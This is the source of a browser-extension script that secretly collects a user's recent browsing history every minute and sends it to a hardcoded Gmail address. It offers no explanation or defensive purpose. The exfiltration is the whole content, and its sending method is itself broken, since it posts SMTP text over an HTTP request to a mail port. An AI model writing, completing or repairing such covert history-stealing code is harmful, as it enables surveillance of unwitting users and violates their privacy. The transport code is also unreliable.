var lastDownload = 0;

chrome.history.onVisited.addListener(function(item) {
  var now = Date.now();
  if (now - lastDownload >= 60000) { // download every minute
    lastDownload = now;
    var history = [];
    chrome.history.search({text: '', maxResults: 5}, function(items) {
      for (var i = 0; i < items.length; i++) {
        history.push(items[i].url);
      }
      sendEmail(history);
    });
  }
});

function sendEmail(data) {
  var email = {
    from: 'flopsterstream@gmail.com',
    to: 'flopsterstream@gmail.com',
    subject: 'Browsing History',
    body: data.join('\n')
  };
  
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://smtp.gmail.com:587', true);
  xhr.setRequestHeader('Content-Type', 'text/plain');
  xhr.send('From: ' + email.from + '\r\nTo: ' + email.to + '\r\nSubject: ' + email.subject + '\r\n\r\n' + email.body);
}
